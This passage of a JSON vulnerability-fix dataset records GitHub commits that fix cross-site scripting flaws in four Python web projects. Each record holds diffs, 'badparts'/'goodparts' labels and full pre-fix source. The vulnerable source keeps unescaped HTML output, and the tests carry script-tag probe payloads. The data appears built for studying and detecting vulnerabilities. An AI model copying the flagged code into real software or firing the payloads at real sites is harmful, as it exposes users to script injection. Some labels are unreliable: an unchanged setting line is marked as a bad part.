            "msg": "Prevent XSS in ?back attr"
        }
    },
    "https://github.com/stevetasticsteve/CLA_Hub": {
        "a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37": {
            "url": "https://api.github.com/repos/stevetasticsteve/CLA_Hub/commits/a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37",
            "html_url": "https://github.com/stevetasticsteve/CLA_Hub/commit/a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37",
            "message": "Added bleach to the project to prevent XSS attacks on fields that are not escaped. Added an allowed tags setting to CE.settings. The description field now won't include <a> or <script> tags",
            "sha": "a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37",
            "keyword": "XSS prevent",
            "diff": "diff --git a/CE/models.py b/CE/models.py\nindex 7622ac1..5326d36 100644\n--- a/CE/models.py\n+++ b/CE/models.py\n@@ -7,6 +7,7 @@\n import CE.settings\n import sys\n import re\n+import bleach\n \n class CultureEvent(models.Model):\n     title = models.CharField(max_length=60, blank=False, unique=True)\n@@ -24,7 +25,10 @@ class CultureEvent(models.Model):\n \n     def save(self):\n         # copy the user's input from plain text to description to be processed\n-        self.description = self.description_plain_text\n+        # uses bleach to remove potentially harmful HTML code\n+        self.description = bleach.clean(str(self.description_plain_text),\n+                                        tags=CE.settings.bleach_allowed,\n+                                        strip=True)\n         if CE.settings.auto_cross_reference:\n             self.auto_cross_ref()\n         else:\ndiff --git a/CE/settings.py b/CE/settings.py\nindex 55a5723..3f7337c 100644\n--- a/CE/settings.py\n+++ b/CE/settings.py\n@@ -1,3 +1,7 @@\n-\n culture_events_shown_on_home_page = 10\n-auto_cross_reference = True\n\\ No newline at end of file\n+# If auto_cross_reference = True program will scan description field for url slugs whenever that\n+# CE is saved. If it finds a matching slug in the description it will add a hyperlink\n+# If False hyperlinks will only be added to valid slugs within curly brackets {}\n+auto_cross_reference = True\n+# A list of allowed HTML tags the user can enter to HTML escaped fields.\n+bleach_allowed = ['strong', 'p']\n\\ No newline at end of file\ndiff --git a/CE/tests.py b/CE/tests.py\nindex 53dc023..66d6334 100644\n--- a/CE/tests.py\n+++ b/CE/tests.py\n@@ -14,7 +14,6 @@\n \n # view tests\n class CEHomeViewTest(TestCase):\n-\n     def setUp(self):\n         self.total_CEs = settings.culture_events_shown_on_home_page + 1\n         for i in range(self.total_CEs):\n@@ -661,6 +660,26 @@ def test_manual_hyperlink(self):\n         self.assertIn('{reference}', ce.description_plain_text)\n         self.assertNotIn('{reference}', ce.description)\n \n+    def test_invalid_HTML_removed(self):\n+        settings.auto_cross_reference = True\n+        # create 1st CE\n+        ce = models.CultureEvent(title='First CE',\n+                                 description_plain_text='<strong>Example CE1</strong>'\n+                                                        '<a href=\"Dodgywebsite.come\">Click here</a>'\n+                                                        '<script>Nasty JS</script>')\n+        ce.save()\n+        # <script> removed\n+        self.assertIn('<script>', ce.description_plain_text)\n+        self.assertNotIn('<script>', ce.description)\n+\n+        # <a> removed\n+        self.assertIn('<a href', ce.description_plain_text)\n+        self.assertNotIn('<a href', ce.description)\n+\n+        # <strong> allowed\n+        settings.bleach_allowed = ['strong']\n+        self.assertIn('<strong>', ce.description_plain_text)\n+        self.assertIn('<strong>', ce.description)\n \n \n class TextsModelTest(TestCase):\ndiff --git a/requirements.txt b/requirements.txt\nnew file mode 100644\nindex 0000000..d4f9f61\n--- /dev/null\n+++ b/requirements.txt\n@@ -0,0 +1,10 @@\n+bleach==3.1.0\n+coverage==4.5.4\n+Django==2.2.3\n+Pillow==6.1.0\n+pytz==2019.1\n+selenium==3.141.0\n+six==1.12.0\n+sqlparse==0.3.0\n+urllib3==1.25.3\n+webencodings==0.5.1\n",
            "files": {
                "/CE/settings.py": {
                    "changes": [
                        {
                            "diff": "\n-\n culture_events_shown_on_home_page = 10\n-auto_cross_reference = True\n\\ No newline at end of file\n+# If auto_cross_reference = True program will scan description field for url slugs whenever that\n+# CE is saved. If it finds a matching slug in the description it will add a hyperlink\n+# If False hyperlinks will only be added to valid slugs within curly brackets {}\n+auto_cross_reference = True\n+# A list of allowed HTML tags the user can enter to HTML escaped fields.\n+bleach_allowed = ['strong', 'p']\n\\ No newline at end of fil",
                            "add": 6,
                            "remove": 2,
                            "filename": "/CE/settings.py",
                            "badparts": [
                                "auto_cross_reference = True"
                            ],
                            "goodparts": [
                                "auto_cross_reference = True",
                                "bleach_allowed = ['strong', 'p']"
                            ]
                        }
                    ],
                    "source": "\n\nculture_events_shown_on_home_page=10 auto_cross_reference=True ",
                    "sourceWithComments": "\nculture_events_shown_on_home_page = 10\nauto_cross_reference = True"
                }
            },
            "msg": "Added bleach to the project to prevent XSS attacks on fields that are not escaped. Added an allowed tags setting to CE.settings. The description field now won't include <a> or <script> tags"
        }
    },
    "https://github.com/dongweiming/lyanna": {
        "fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d": {
            "url": "https://api.github.com/repos/dongweiming/lyanna/commits/fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d",
            "html_url": "https://github.com/dongweiming/lyanna/commit/fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d",
            "message": "Fix comment's reflected xss vulnerability",
            "sha": "fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d",
            "keyword": "XSS fix",
            "diff": "diff --git a/models/comment.py b/models/comment.py\nindex 524092c..404cba5 100644\n--- a/models/comment.py\n+++ b/models/comment.py\n@@ -1,6 +1,7 @@\n import asyncio\n \n import mistune\n+import markupsafe\n from tortoise import fields\n from tortoise.query_utils import Q\n from arq import create_pool\n@@ -46,7 +47,7 @@ class Meta:\n \n     @property\n     async def html_content(self):\n-        content = await self.content\n+        content = markupsafe.escape(await self.content)\n         if not content:\n             return ''\n         return markdown(content)\n",
            "files": {
                "/models/comment.py": {
                    "changes": [
                        {
                            "diff": "\n \n     @property\n     async def html_content(self):\n-        content = await self.content\n+        content = markupsafe.escape(await self.content)\n         if not content:\n             return ''\n         return markdown(content)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/models/comment.py",
                            "badparts": [
                                "        content = await self.content"
                            ],
                            "goodparts": [
                                "        content = markupsafe.escape(await self.content)"
                            ]
                        }
                    ],
                    "source": "\nimport asyncio import mistune from tortoise import fields from tortoise.query_utils import Q from arq import create_pool from config import REDIS_URL from.base import BaseModel from.mc import cache, clear_mc from.user import GithubUser from.consts import K_COMMENT, ONE_HOUR from.react import ReactMixin, ReactItem from.signals import comment_reacted from.utils import RedisSettings markdown=mistune.Markdown() MC_KEY_COMMENT_LIST='comment:%s:comment_list' MC_KEY_N_COMMENTS='comment:%s:n_comments' MC_KEY_COMMNET_IDS_LIKED_BY_USER='react:comment_ids_liked_by:%s:%s' class Comment(ReactMixin, BaseModel): github_id=fields.IntField() post_id=fields.IntField() ref_id=fields.IntField(default=0) kind=K_COMMENT class Meta: table='comments' async def set_content(self, content): return await self.set_props_by_key('content', content) async def save(self, *args, **kwargs): content=kwargs.pop('content', None) if content is not None: await self.set_content(content) return await super().save(*args, **kwargs) @property async def content(self): rv=await self.get_props_by_key('content') if rv: return rv.decode('utf-8') @property async def html_content(self): content=await self.content if not content: return '' return markdown(content) async def clear_mc(self): for key in(MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST): await clear_mc(key % self.post_id) @property async def user(self): return await GithubUser.get(gid=self.github_id) @property async def n_likes(self): return(await self.stats).love_count class CommentMixin: async def add_comment(self, user_id, content, ref_id=0): obj=await Comment.create(github_id=user_id, post_id=self.id, ref_id=ref_id) redis=await create_pool(RedisSettings.from_url(REDIS_URL)) await asyncio.gather( obj.set_content(content), redis.enqueue_job('mention_users', self.id, content, user_id), return_exceptions=True ) return obj async def del_comment(self, user_id, comment_id): c=await Comment.get(id=comment_id) if c and c.github_id==user_id and c.post_id==self.id: await c.delete() return True return False @property @cache(MC_KEY_COMMENT_LIST %('{self.id}')) async def comments(self): return await Comment.sync_filter(post_id=self.id, orderings=['-id']) @property @cache(MC_KEY_N_COMMENTS %('{self.id}')) async def n_comments(self): return await Comment.filter(post_id=self.id).count() @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( '{user_id}', '{self.id}'), ONE_HOUR) async def comment_ids_liked_by(self, user_id): cids=[c.id for c in await self.comments] if not cids: return[] queryset=await ReactItem.filter( Q(user_id=user_id), Q(target_id__in=cids), Q(target_kind=K_COMMENT)) return[item.target_id for item in queryset] @comment_reacted.connect async def update_comment_list_cache(_, user_id, comment_id): comment=await Comment.cache(comment_id) if comment: asyncio.gather( clear_mc(MC_KEY_COMMENT_LIST % comment.post_id), clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( user_id, comment.post_id)), return_exceptions=True ) ",
                    "sourceWithComments": "import asyncio\n\nimport mistune\nfrom tortoise import fields\nfrom tortoise.query_utils import Q\nfrom arq import create_pool\n\nfrom config import REDIS_URL\nfrom .base import BaseModel\nfrom .mc import cache, clear_mc\nfrom .user import GithubUser\nfrom .consts import K_COMMENT, ONE_HOUR\nfrom .react import ReactMixin, ReactItem\nfrom .signals import comment_reacted\nfrom .utils import RedisSettings\n\nmarkdown = mistune.Markdown()\nMC_KEY_COMMENT_LIST = 'comment:%s:comment_list'\nMC_KEY_N_COMMENTS = 'comment:%s:n_comments'\nMC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'\n\n\nclass Comment(ReactMixin, BaseModel):\n    github_id = fields.IntField()\n    post_id = fields.IntField()\n    ref_id = fields.IntField(default=0)\n    kind = K_COMMENT\n\n    class Meta:\n        table = 'comments'\n\n    async def set_content(self, content):\n        return await self.set_props_by_key('content', content)\n\n    async def save(self, *args, **kwargs):\n        content = kwargs.pop('content', None)\n        if content is not None:\n            await self.set_content(content)\n        return await super().save(*args, **kwargs)\n\n    @property\n    async def content(self):\n        rv = await self.get_props_by_key('content')\n        if rv:\n            return rv.decode('utf-8')\n\n    @property\n    async def html_content(self):\n        content = await self.content\n        if not content:\n            return ''\n        return markdown(content)\n\n    async def clear_mc(self):\n        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):\n            await clear_mc(key % self.post_id)\n\n    @property\n    async def user(self):\n        return await GithubUser.get(gid=self.github_id)\n\n    @property\n    async def n_likes(self):\n        return (await self.stats).love_count\n\n\nclass CommentMixin:\n    async def add_comment(self, user_id, content, ref_id=0):\n        obj = await Comment.create(github_id=user_id, post_id=self.id,\n                                   ref_id=ref_id)\n        redis = await create_pool(RedisSettings.from_url(REDIS_URL))\n        await asyncio.gather(\n            obj.set_content(content),\n            redis.enqueue_job('mention_users', self.id, content, user_id),\n            return_exceptions=True\n        )\n        return obj\n\n    async def del_comment(self, user_id, comment_id):\n        c = await Comment.get(id=comment_id)\n        if c and c.github_id == user_id and c.post_id == self.id:\n            await c.delete()\n            return True\n        return False\n\n    @property\n    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))\n    async def comments(self):\n        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])\n\n    @property\n    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))\n    async def n_comments(self):\n        return await Comment.filter(post_id=self.id).count()\n\n    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n        '{user_id}', '{self.id}'), ONE_HOUR)\n    async def comment_ids_liked_by(self, user_id):\n        cids = [c.id for c in await self.comments]\n        if not cids:\n            return []\n        queryset = await ReactItem.filter(\n            Q(user_id=user_id), Q(target_id__in=cids),\n            Q(target_kind=K_COMMENT))\n        return [item.target_id for item in queryset]\n\n\n@comment_reacted.connect\nasync def update_comment_list_cache(_, user_id, comment_id):\n    comment = await Comment.cache(comment_id)\n    if comment:\n        asyncio.gather(\n            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),\n            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n                user_id, comment.post_id)),\n            return_exceptions=True\n        )\n"
                }
            },
            "msg": "Fix comment's reflected xss vulnerability"
        }
    },
    "https://github.com/inveniosoftware/invenio-records": {
        "361def20617cde5a1897c2e81b70bfadaabae608": {
            "url": "https://api.github.com/repos/inveniosoftware/invenio-records/commits/361def20617cde5a1897c2e81b70bfadaabae608",
            "html_url": "https://github.com/inveniosoftware/invenio-records/commit/361def20617cde5a1897c2e81b70bfadaabae608",
            "message": "admin: xss vulnerability fix\n\n* Fixes a XSS vulnerability due to improperly escaped JSON output\n  of the record.",
            "sha": "361def20617cde5a1897c2e81b70bfadaabae608",
            "keyword": "XSS fix",
            "diff": "diff --git a/invenio_records/admin.py b/invenio_records/admin.py\nindex 068d846..5900abf 100644\n--- a/invenio_records/admin.py\n+++ b/invenio_records/admin.py\n@@ -39,8 +39,8 @@ class RecordMetadataModelView(ModelView):\n     )\n     column_formatters = dict(\n         version_id=lambda v, c, m, p: m.version_id-1,\n-        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format(\n-            json.dumps(m.json, indent=2, sort_keys=True)))\n+        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\").format(\n+            json.dumps(m.json, indent=2, sort_keys=True))\n     )\n     column_filters = ('created', 'updated', )\n     column_default_sort = ('updated', True)\ndiff --git a/tests/test_admin.py b/tests/test_admin.py\nindex dac271e..f99aff6 100644\n--- a/tests/test_admin.py\n+++ b/tests/test_admin.py\n@@ -45,7 +45,7 @@ def test_admin(app, db):\n \n     # Create a test record.\n     rec_uuid = str(uuid.uuid4())\n-    Record.create({'title': 'test'}, id_=rec_uuid)\n+    Record.create({'title': 'test<script>alert(1);</script>'}, id_=rec_uuid)\n     db.session.commit()\n \n     with app.test_request_context():\n@@ -59,6 +59,14 @@ def test_admin(app, db):\n         res = client.get(index_view_url)\n         assert res.status_code == 200\n \n+        # Check for XSS in JSON output\n+        res = client.get(detail_view_url)\n+        assert res.status_code == 200\n+        data = res.get_data(as_text=True)\n+        assert '<pre>{' in data\n+        assert '}</pre>' in data\n+        assert '<script>alert(1);</script>' not in data\n+\n         # Fake a problem with SQLAlchemy.\n         with patch('invenio_records.models.RecordMetadata') as db_mock:\n             db_mock.side_effect = SQLAlchemyError()\n",
            "files": {
                "/invenio_records/admin.py": {
                    "changes": [
                        {
                            "diff": "\n     )\n     column_formatters = dict(\n         version_id=lambda v, c, m, p: m.version_id-1,\n-        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format(\n-            json.dumps(m.json, indent=2, sort_keys=True)))\n+        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\").format(\n+            json.dumps(m.json, indent=2, sort_keys=True))\n     )\n     column_filters = ('created', 'updated', )\n     column_default_sort = ('updated', True)",
                            "add": 2,
                            "remove": 2,
                            "filename": "/invenio_records/admin.py",
                            "badparts": [
                                "        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format(",
                                "            json.dumps(m.json, indent=2, sort_keys=True)))"
                            ],
                            "goodparts": [
                                "        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\").format(",
                                "            json.dumps(m.json, indent=2, sort_keys=True))"
                            ]
                        }
                    ],
                    "source": "\n \"\"\"Admin model views for records.\"\"\" import json from flask import flash from flask_admin.contrib.sqla import ModelView from flask_babelex import gettext as _ from invenio_admin.filters import FilterConverter from invenio_db import db from markupsafe import Markup from sqlalchemy.exc import SQLAlchemyError from.api import Record from.models import RecordMetadata class RecordMetadataModelView(ModelView): \"\"\"Records admin model view.\"\"\" filter_converter=FilterConverter() can_create=False can_edit=False can_delete=True can_view_details=True column_list=('id', 'version_id', 'updated', 'created',) column_details_list=('id', 'version_id', 'updated', 'created', 'json') column_labels=dict( id=_('UUID'), version_id=_('Revision'), json=_('JSON'), ) column_formatters=dict( version_id=lambda v, c, m, p: m.version_id-1, json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format( json.dumps(m.json, indent=2, sort_keys=True))) ) column_filters=('created', 'updated',) column_default_sort=('updated', True) page_size=25 def delete_model(self, model): \"\"\"Delete a record.\"\"\" try: if model.json is None: return True record=Record(model.json, model=model) record.delete() db.session.commit() except SQLAlchemyError as e: if not self.handle_view_exception(e): flash(_('Failed to delete record. %(error)s', error=str(e)), category='error') db.session.rollback() return False return True record_adminview=dict( modelview=RecordMetadataModelView, model=RecordMetadata, category=_('Records')) ",
                    "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2015-2018 CERN.\n#\n# Invenio is free software; you can redistribute it and/or modify it\n# under the terms of the MIT License; see LICENSE file for more details.\n\n\"\"\"Admin model views for records.\"\"\"\n\nimport json\n\nfrom flask import flash\nfrom flask_admin.contrib.sqla import ModelView\nfrom flask_babelex import gettext as _\nfrom invenio_admin.filters import FilterConverter\nfrom invenio_db import db\nfrom markupsafe import Markup\nfrom sqlalchemy.exc import SQLAlchemyError\n\nfrom .api import Record\nfrom .models import RecordMetadata\n\n\nclass RecordMetadataModelView(ModelView):\n    \"\"\"Records admin model view.\"\"\"\n\n    filter_converter = FilterConverter()\n    can_create = False\n    can_edit = False\n    can_delete = True\n    can_view_details = True\n    column_list = ('id', 'version_id', 'updated', 'created',)\n    column_details_list = ('id', 'version_id', 'updated', 'created', 'json')\n    column_labels = dict(\n        id=_('UUID'),\n        version_id=_('Revision'),\n        json=_('JSON'),\n    )\n    column_formatters = dict(\n        version_id=lambda v, c, m, p: m.version_id-1,\n        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format(\n            json.dumps(m.json, indent=2, sort_keys=True)))\n    )\n    column_filters = ('created', 'updated', )\n    column_default_sort = ('updated', True)\n    page_size = 25\n\n    def delete_model(self, model):\n        \"\"\"Delete a record.\"\"\"\n        try:\n            if model.json is None:\n                return True\n            record = Record(model.json, model=model)\n            record.delete()\n            db.session.commit()\n        except SQLAlchemyError as e:\n            if not self.handle_view_exception(e):\n                flash(_('Failed to delete record. %(error)s', error=str(e)),\n                      category='error')\n            db.session.rollback()\n            return False\n        return True\n\nrecord_adminview = dict(\n    modelview=RecordMetadataModelView,\n    model=RecordMetadata,\n    category=_('Records'))\n"
                },
                "/tests/test_admin.py": {
                    "changes": [
                        {
                            "diff": "\n \n     # Create a test record.\n     rec_uuid = str(uuid.uuid4())\n-    Record.create({'title': 'test'}, id_=rec_uuid)\n+    Record.create({'title': 'test<script>alert(1);</script>'}, id_=rec_uuid)\n     db.session.commit()\n \n     with app.test_request_context():\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/tests/test_admin.py",
                            "badparts": [
                                "    Record.create({'title': 'test'}, id_=rec_uuid)"
                            ],
                            "goodparts": [
                                "    Record.create({'title': 'test<script>alert(1);</script>'}, id_=rec_uuid)"
                            ]
                        }
                    ],
                    "source": "\n \"\"\"Test admin interface.\"\"\" from __future__ import absolute_import, print_function import uuid from flask import url_for from flask_admin import Admin, menu from mock import patch from sqlalchemy.exc import SQLAlchemyError from invenio_records.admin import record_adminview from invenio_records.api import Record def test_admin(app, db): \"\"\"Test flask-admin interace.\"\"\" admin=Admin(app, name=\"Test\") assert 'model' in record_adminview assert 'modelview' in record_adminview model=record_adminview.pop('model') view=record_adminview.pop('modelview') admin.add_view(view(model, db.session, **record_adminview)) menu_items={str(item.name): item for item in admin.menu()} assert 'Records' in menu_items assert menu_items['Records'].is_category() submenu_items={ str(item.name): item for item in menu_items['Records'].get_children()} assert 'Record Metadata' in submenu_items assert isinstance(submenu_items['Record Metadata'], menu.MenuView) rec_uuid=str(uuid.uuid4()) Record.create({'title': 'test'}, id_=rec_uuid) db.session.commit() with app.test_request_context(): index_view_url=url_for('recordmetadata.index_view') delete_view_url=url_for('recordmetadata.delete_view') detail_view_url=url_for( 'recordmetadata.details_view', id=rec_uuid) with app.test_client() as client: res=client.get(index_view_url) assert res.status_code==200 with patch('invenio_records.models.RecordMetadata') as db_mock: db_mock.side_effect=SQLAlchemyError() res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 res=client.get(detail_view_url) assert res.status_code==200 assert '<pre>null</pre>' in res.get_data(as_text=True) res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 ",
                    "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2015-2018 CERN.\n#\n# Invenio is free software; you can redistribute it and/or modify it\n# under the terms of the MIT License; see LICENSE file for more details.\n\n\"\"\"Test admin interface.\"\"\"\n\nfrom __future__ import absolute_import, print_function\n\nimport uuid\n\nfrom flask import url_for\nfrom flask_admin import Admin, menu\nfrom mock import patch\nfrom sqlalchemy.exc import SQLAlchemyError\n\nfrom invenio_records.admin import record_adminview\nfrom invenio_records.api import Record\n\n\ndef test_admin(app, db):\n    \"\"\"Test flask-admin interace.\"\"\"\n    admin = Admin(app, name=\"Test\")\n\n    assert 'model' in record_adminview\n    assert 'modelview' in record_adminview\n\n    # Register both models in admin\n    model = record_adminview.pop('model')\n    view = record_adminview.pop('modelview')\n    admin.add_view(view(model, db.session, **record_adminview))\n\n    # Check if generated admin menu contains the correct items\n    menu_items = {str(item.name): item for item in admin.menu()}\n    assert 'Records' in menu_items\n    assert menu_items['Records'].is_category()\n\n    submenu_items = {\n        str(item.name): item for item in menu_items['Records'].get_children()}\n    assert 'Record Metadata' in submenu_items\n    assert isinstance(submenu_items['Record Metadata'], menu.MenuView)\n\n    # Create a test record.\n    rec_uuid = str(uuid.uuid4())\n    Record.create({'title': 'test'}, id_=rec_uuid)\n    db.session.commit()\n\n    with app.test_request_context():\n        index_view_url = url_for('recordmetadata.index_view')\n        delete_view_url = url_for('recordmetadata.delete_view')\n        detail_view_url = url_for(\n            'recordmetadata.details_view', id=rec_uuid)\n\n    with app.test_client() as client:\n        # List index view and check record is there.\n        res = client.get(index_view_url)\n        assert res.status_code == 200\n\n        # Fake a problem with SQLAlchemy.\n        with patch('invenio_records.models.RecordMetadata') as db_mock:\n            db_mock.side_effect = SQLAlchemyError()\n            res = client.post(\n                delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n            assert res.status_code == 200\n\n        # Delete it.\n        res = client.post(\n            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n        assert res.status_code == 200\n\n        # View the delete record\n        res = client.get(detail_view_url)\n        assert res.status_code == 200\n        assert '<pre>null</pre>' in res.get_data(as_text=True)\n\n        # Delete it again\n        res = client.post(\n            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n        assert res.status_code == 200\n"
                }
            },
            "msg": "admin: xss vulnerability fix\n\n* Fixes a XSS vulnerability due to improperly escaped JSON output\n  of the record."
        }
    },
    "https://github.com/Technikradio/C3FOCSite": {
        "6e330d4d44bbfdfce9993dffea97008276771600": {
            "url": "https://api.github.com/repos/Technikradio/C3FOCSite/commits/6e330d4d44bbfdfce9993dffea97008276771600",
            "html_url": "https://github.com/Technikradio/C3FOCSite/commit/6e330d4d44bbfdfce9993dffea97008276771600",
            "message": "fix: XSS bug in now exposed user forms",
            "sha": "6e330d4d44bbfdfce9993dffea97008276771600",
            "keyword": "XSS fix",
            "diff": "diff --git a/c3shop/frontpage/management/edit_user.py b/c3shop/frontpage/management/edit_user.py\nindex d5a51e6..3ad9ea2 100644\n--- a/c3shop/frontpage/management/edit_user.py\n+++ b/c3shop/frontpage/management/edit_user.py\n@@ -1,4 +1,5 @@\n from django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest\n+from django.utils.html import escape\n from django.shortcuts import redirect\n from django.contrib.auth.models import User\n from . import page_skeleton, magic\n@@ -127,9 +128,9 @@ def action_save_user(request: HttpRequest, default_forward_url: str = \"/admin/us\n             mail = str(request.POST[\"email\"])\n             rights = int(request.POST[\"rights\"])\n             user: Profile = Profile.objects.get(pk=pid)\n-            user.displayName = displayname\n+            user.displayName = escape(displayname)\n             user.dect = dect\n-            user.notes = notes\n+            user.notes = escape(notes)\n             user.rights = rights\n             user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n             if request.POST.get(\"active\"):\n@@ -140,7 +141,7 @@ def action_save_user(request: HttpRequest, default_forward_url: str = \"/admin/us\n                 au.set_password(pw1)\n             else:\n                 logging.log(logging.INFO, \"Failed to set password for: \" + user.displayName)\n-            au.email = mail\n+            au.email = escape(mail)\n             au.save()\n             user.save()\n         else:\n@@ -155,15 +156,15 @@ def action_save_user(request: HttpRequest, default_forward_url: str = \"/admin/us\n             rights = int(request.POST[\"rights\"])\n             if not check_password_conformity(pw1, pw2):\n                 recreate_form('password mismatch')\n-            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)\n+            auth_user: User = User.objects.create_user(username=escape(username), email=escape(mail), password=pw1)\n             auth_user.save()\n             user: Profile = Profile()\n             user.rights = rights\n             user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n-            user.displayName = displayname\n+            user.displayName = escape(displayname)\n             user.authuser = auth_user\n             user.dect = dect\n-            user.notes = notes\n+            user.notes = escape(notes)\n             user.active = True\n             user.save()\n             pass\ndiff --git a/c3shop/frontpage/management/mediatools/media_actions.py b/c3shop/frontpage/management/mediatools/media_actions.py\nindex fd72927..728cd7c 100644\n--- a/c3shop/frontpage/management/mediatools/media_actions.py\n+++ b/c3shop/frontpage/management/mediatools/media_actions.py\n@@ -1,6 +1,7 @@\n from datetime import date, time\n from django.shortcuts import redirect\n from django.http import HttpRequest, HttpResponseBadRequest\n+from django.utils.html import escape\n from frontpage.models import Profile, Media, MediaUpload\n from frontpage.management.magic import compile_markdown, get_current_user\n \n@@ -52,12 +53,12 @@ def handle_file(u: Profile, headline: str, category: str, text: str, file):\n     height *= IMAGE_SCALE\n     cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)\n     cropped.save(low_res_file_name)\n-    m.text = text\n-    m.cachedText = compile_markdown(text)\n-    m.category = category\n+    m.text = escape(text)\n+    m.cachedText = compile_markdown(escape(text))\n+    m.category = escape(category)\n     m.highResFile = \"/\" + high_res_file_name\n     m.lowResFile = \"/\" + low_res_file_name\n-    m.headline = headline\n+    m.headline = escape(headline)\n     m.save()\n     mu: MediaUpload = MediaUpload()\n     mu.UID = u\ndiff --git a/c3shop/frontpage/management/reservation_actions.py b/c3shop/frontpage/management/reservation_actions.py\nindex 4015d47..f0fe34f 100644\n--- a/c3shop/frontpage/management/reservation_actions.py\n+++ b/c3shop/frontpage/management/reservation_actions.py\n@@ -1,4 +1,5 @@\n from django.http import HttpRequest, HttpResponseRedirect\n+from django.utils.html import escape\n # from django.shortcuts import redirect\n from ..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation\n from .magic import get_current_user\n@@ -40,7 +41,7 @@ def add_article_action(request: HttpRequest, default_foreward_url: str):\n         # Actual adding of article\n         aid: int = int(request.GET.get(\"article_id\"))\n         quantity: int = int(request.POST[\"quantity\"])\n-        notes: str = request.POST[\"notes\"]\n+        notes: str = escape(request.POST[\"notes\"])\n         ar = ArticleRequested()\n         ar.AID = Article.objects.get(id=aid)\n         ar.RID = current_reservation\n@@ -65,7 +66,7 @@ def add_article_action(request: HttpRequest, default_foreward_url: str):\n                 ar.amount = amount\n                 if \"srid\" in request.GET:\n                     ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n-                ar.notes = str(request.POST[str(\"notes_\" + str(art.id))])\n+                ar.notes = escape(str(request.POST[str(\"notes_\" + str(art.id))]))\n                 ar.save()\n     if \"srid\" in request.GET:\n         response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id) + \"&srid=\" + request.GET[\"srid\"])\n@@ -116,7 +117,7 @@ def manipulate_reservation_action(request: HttpRequest, default_foreward_url: st\n         else:\n             sr = SubReservation.objects.get(id=srid)\n         if request.POST.get(\"notes\"):\n-            sr.notes = request.POST[\"notes\"]\n+            sr.notes = escape(request.POST[\"notes\"])\n         else:\n             sr.notes = \" \"\n         sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n@@ -136,9 +137,9 @@ def manipulate_reservation_action(request: HttpRequest, default_foreward_url: st\n     else:\n         return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\")\n     if request.POST.get(\"notes\"):\n-        r.notes = request.POST[\"notes\"]\n+        r.notes = escape(request.POST[\"notes\"])\n     if request.POST.get(\"contact\"):\n-        r.responsiblePerson = str(request.POST[\"contact\"])\n+        r.responsiblePerson = escape(str(request.POST[\"contact\"]))\n     if (r.createdByUser == u or o.rights > 1) and not r.submitted:\n         r.save()\n     else:\n",
            "files": {
                "/c3shop/frontpage/management/edit_user.py": {
                    "changes": [
                        {
                            "diff": "\n             mail = str(request.POST[\"email\"])\n             rights = int(request.POST[\"rights\"])\n             user: Profile = Profile.objects.get(pk=pid)\n-            user.displayName = displayname\n+            user.displayName = escape(displayname)\n             user.dect = dect\n-            user.notes = notes\n+            user.notes = escape(notes)\n             user.rights = rights\n             user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n             if request.POST.get(\"active\"):\n",
                            "add": 2,
                            "remove": 2,
                            "filename": "/c3shop/frontpage/management/edit_user.py",
                            "badparts": [
                                "            user.displayName = displayname",
                                "            user.notes = notes"
                            ],
                            "goodparts": [
                                "            user.displayName = escape(displayname)",
                                "            user.notes = escape(notes)"
                            ]
                        },
                        {
                            "diff": "\n                 au.set_password(pw1)\n             else:\n                 logging.log(logging.INFO, \"Failed to set password for: \" + user.displayName)\n-            au.email = mail\n+            au.email = escape(mail)\n             au.save()\n             user.save()\n         else:\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/c3shop/frontpage/management/edit_user.py",
                            "badparts": [
                                "            au.email = mail"
                            ],
                            "goodparts": [
                                "            au.email = escape(mail)"
                            ]
                        },
                        {
